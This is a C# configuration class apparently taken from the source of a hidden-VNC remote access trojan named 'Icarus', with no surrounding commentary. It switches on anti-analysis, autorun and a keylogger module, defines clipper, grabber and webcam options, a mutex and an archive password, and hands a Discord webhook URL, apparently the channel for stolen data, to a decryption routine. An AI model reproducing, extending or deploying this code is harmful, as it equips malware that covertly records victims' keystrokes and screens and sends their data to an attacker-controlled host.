namespace ShitarusPrivate.HVNC.Helpers
{
    public static class Config
    {
        public static string Version = "1.0";

        public static string DebugMode = "1";

        public static string Mutex = "ewf54wef3434";

        public static string AntiAnalysis = "1";

        public static string Autorun = "1";

        public static string StartDelay = "0";

        public static string WebcamScreenshot = "0";

        public static string KeyloggerModule = "1";

        public static string ClipperModule = "0";

        public static string GrabberModule = "0";

        public static string Avatar = "https://i.ibb.co/kDLd65M/dcicon.png";

        public static string Username = "Icarus";

        public static int GrabberSizeLimit = 5120;

        internal static string zipPass = "ICARUS";

        public static void Init()
        {
            StringsCrypt.DecryptConfig("https://discord.com/api/webhooks/1014922643390083133/Ix87W1-9_SpBknLkk7WcJLAfKdSOzRN0Lelk1ADNc2eGEvepYwCGpjPDDBurWDyL50uB");
        }
    }
}
